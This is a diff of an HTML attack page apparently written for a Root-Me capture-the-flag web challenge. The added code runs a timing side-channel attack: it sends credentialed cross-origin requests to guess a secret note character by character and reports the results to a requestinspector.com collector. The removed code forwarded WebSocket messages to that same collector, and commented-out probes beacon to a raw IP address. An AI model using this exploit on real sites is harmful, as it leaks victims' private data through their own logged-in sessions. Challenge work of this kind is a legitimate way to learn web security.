@@ -1,25 +1,70 @@
-<!DOCTYPE html>
-<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Symphony</title>
+</head>
+
 <body>
+
   <script>
-    var ws = new WebSocket('wss://http://ctf30.root-me.org/ws');
-    ws.onopen = function() {
-      console.log("WebSocket connection opened successfully.");
-      ws.send("READY");
-    };
-    ws.onmessage = function(event) {
-      console.log("Message received: " + event.data);
-      fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?' + event.data, { method: 'POST', mode: 'no-cors', body: event.data })
-        .then(function(response) {
-          console.log("Fetch request successful.");
-        })
-        .catch(function(error) {
-          console.error("Fetch request error:", error);
-        });
-    };
-    ws.onerror = function(error) {
-      console.error("WebSocket connection error:", error);
-    };
+      fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?présence=JeSuisLa`)
+      for (let i = 0; i < 76; i++) {
+          let alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
+          // Start the clock
+          var start = performance.now()
+
+          // Measure how long it takes to complete the fetch requests
+          fetch(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${392}/zc4r3_4b0ut_+s4mes1t3_c00k1${alpha[i]}`, {
+              mode: 'no-cors',
+              credentials: 'include'
+          }).then(() => {
+              // When fetch finishes, calculate the difference
+              var time = performance.now() - start;
+              console.log("The request took %d ms.", time);
+              if (time > 1800) {
+                  fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?lettre=${alpha[i]}&temps=${time}ms`)
+              }
+          });
+      }
+      // const leak = async (url, id) => {
+      //     return new Promise((r) => {
+      //         let s = document.createElement('script')
+      //         s.src = url
+      //         s.onload = (e) => {
+      //             console.log('Onload event triggered at ' + url);
+      //             fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${url}`)
+      //             fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${s.textContent}`)
+      //             e.target.remove()
+      //             return r(0)
+      //         }
+      //         s.onerror = (e) => {
+      //             console.log('Error event triggered');
+      //             fetch(`http://91.173.39.199:25565/?error=${id}`)
+      //             e.target.remove()
+      //             return r(1)
+      //         }
+      //         document.head.appendChild(s)
+      //     })
+      // }
+      // function probeError(url, id) {
+      //     let script = document.createElement('script');
+      //     script.src = url;
+      //     script.onload = () => {
+      //         console.log('Onload event triggered at ' + url);
+      //         fetch(`https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?url=${url}`)
+      //     }
+      //     script.onerror = () => {
+      //         console.log('Error event triggered');
+      //         fetch(`http://91.173.39.199:25565/?error=${id}`)
+      //     }
+      //     document.head.appendChild(script);
+      // }
+      // leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`, 3202)
+
+
   </script>
+  <h1 style="text-align: center;">-----------------------bienvenue----------------------</h1>
+  <input type="text" name="csrf" value="test">
+
+
 </body>
-</html>
